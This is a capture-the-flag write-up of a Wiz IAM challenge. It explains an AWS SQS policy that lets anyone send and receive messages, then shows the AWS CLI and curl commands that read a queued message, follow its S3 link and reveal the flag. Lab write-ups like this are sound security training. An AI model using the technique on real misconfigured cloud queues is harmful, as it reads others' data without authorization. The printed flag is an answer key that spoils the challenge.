## ~~Google~~ Analytics
We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?
Join our queue and get the secret flag.
> https://bigiamchallenge.com/challenge/2

IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```
## Policy Explained
`"Principal": "*"`: Everyone is allowed.
Normally SQS policies restrict access to:
- specific AWS accounts
- IAM roles
- AWS services
Here there is **no restriction**.

Action:
```json
[
  "sqs:SendMessage",
  "sqs:ReceiveMessage"
]
```
#### 1. `sqs:SendMessage`
You can **put messages onto the queue**.
Example conceptually:
```
App → Queue
```
You push data into the queue.
#### 2. `sqs:ReceiveMessage`
You can **read messages currently waiting in the queue**.
Example:
```
Queue → Consumer
```
You pull data out.

Resource
```
arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2
```
This permission applies only to that queue.

Breakdown:
- `aws` → AWS partition
- `sqs` → SQS service
- `us-east-1` → region
- `092297851374` → AWS account
- `wiz-tbic-analytics-sqs-queue-ca7a1b2` → queue name

# What We Can Do

### Send messages
```
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --message-body "hello"
```
### Receive messages
```
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

# Solution
```bash
C:\Users\krish>aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "df846c5a-c4fc-421f-9d27-ef3d78b63473",
            "ReceiptHandle": "AQEBQGRJUiUUW28+oAsiqLr1CjXmpVZYqjxCSXvKadHhQhboBPtClZKg4UhapA7R5rkofC4uh5SkpvHGkvcsRENQnU+FkHOGGvE2KjbKQPuv4UIBPp6Bat+SWO0bD8aiAFhTqLIdp7wG+JSaIMp/by+M+zCl4vizuBk3uetGy2LnBMNC/OG/kpddjNt+NBwtOx3AKiwfru62egGe0ZprL9zQojwEyP/8cEcJS38JVoyEhkVfrQi7f6Eb4MUZB8BcHGo5eIqCM6Z6fczUCsS9vrU5/JH+qzWxU+fEkn3Kfe0t4WNcI2kiWxXO5BziHSY6xiQSf5GC42ZY195Kcdb75pdd5BW6I3oaVrjhfVg33vAvy0WkiwuGcLGwvOTHPsDBZU/hkItFTx2v2jgT9Aw2eFkD/fKIEsAkgMNGxXPpiUGi/Aw=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```
We got the message with link to flag: https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html

```bash
C:\Users\krish>curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

> Flag: `{wiz:you-are-at-the-front-of-the-queue}`